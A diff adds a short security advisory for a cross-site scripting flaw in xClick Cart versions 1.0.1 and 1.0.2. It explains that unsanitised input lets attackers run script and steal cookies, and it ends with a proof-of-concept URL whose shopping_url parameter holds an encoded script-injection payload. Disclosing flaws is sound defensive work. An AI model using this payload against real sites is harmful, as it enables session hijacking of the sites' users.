@@ -1,0 +1,9 @@
+source: http://www.securityfocus.com/bid/51699/info
+
+xClick Cart is prone to a cross-site scripting vulnerability because it fails to properly sanitize user-supplied input.
+
+An attacker may leverage this issue to execute arbitrary script code in the browser of an unsuspecting user in the context of the affected site. This may allow the attacker to steal cookie-based authentication credentials and launch other attacks.
+
+xClick Cart versions 1.0.1 and 1.0.2 are affected; other versions may also be vulnerable. 
+
+http://www.example.com/pages/cart/webscr.php?cmd=_cart&ew=1&item_name=Scrimshaw+Kit&item_number=SK1&amount=25.00&quantity=1&shipping=&tax=0&shopping_url=%27;alert%28String.fromCharCode%2888,83,83%29%29//\%27;alert%28String.fromCharCode%2888,83,83%29%29//%22;alert%28String.fromCharCode%2888,83,83%29%29//\%22;alert%28String.fromCharCode%2888,83,83%29%29//--%3E%3C/SCRIPT%3E%22%3E%27%3E%3CSCRIPT%3Ealert%28String.fromCharCode%2888,83,83%29%29%3C/SCRIPT%3E 
